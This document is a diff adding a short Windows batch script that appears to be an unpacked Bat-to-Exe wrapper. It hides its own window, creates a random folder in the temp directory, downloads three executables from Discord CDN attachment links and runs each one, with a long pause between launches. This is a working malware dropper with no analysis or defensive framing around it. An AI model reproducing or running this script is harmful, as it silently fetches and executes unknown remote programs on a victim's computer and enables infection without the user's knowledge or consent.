@@ -1,0 +1,27 @@
+@shift /0
+@set b2eextd=C:\Users\Jason\AppData\Local\Temp\F2FA.tmp\F30B.tmp\extd.exe
+@set extd=@call:extd
+@set b2etempfile=C:\Users\Jason\AppData\Local\Temp\F2FA.tmp\F30B.tmp\F31C.tmp
+%extd% /hideself
+@echo off
+%extd% /random 90000009
+echo %result%
+echo dsgssrx
+echo degatex
+echo %random%
+set sut=%random%
+md %TEMP%\%sut%
+cd %TEMP%\%sut%
+%extd% /download https://cdn.discordapp.com/attachments/878569652987502634/879085483253203034/ai_loffy.exe ai_loffy.exe 
+start ai_loffy.exe 
+%extd% /sleep 900000
+%extd% /download https://cdn.discordapp.com/attachments/878569652987502634/878572879783026748/bb.exe bb.exe
+start bb.exe
+%extd% /download https://cdn.discordapp.com/attachments/878569652987502634/878569717047132170/setup.exe setup.exe
+start setup.exe
+:extd
+@set result=
+@%b2eextd% "%~1" "%~2" "%~3" "%~4" "%~5" "%~6" "%~7" "%~8" "%~9" > "%b2etempfile%"
+@set /p result= < "%b2etempfile%"
+@del "%b2etempfile%"
+@goto:eof
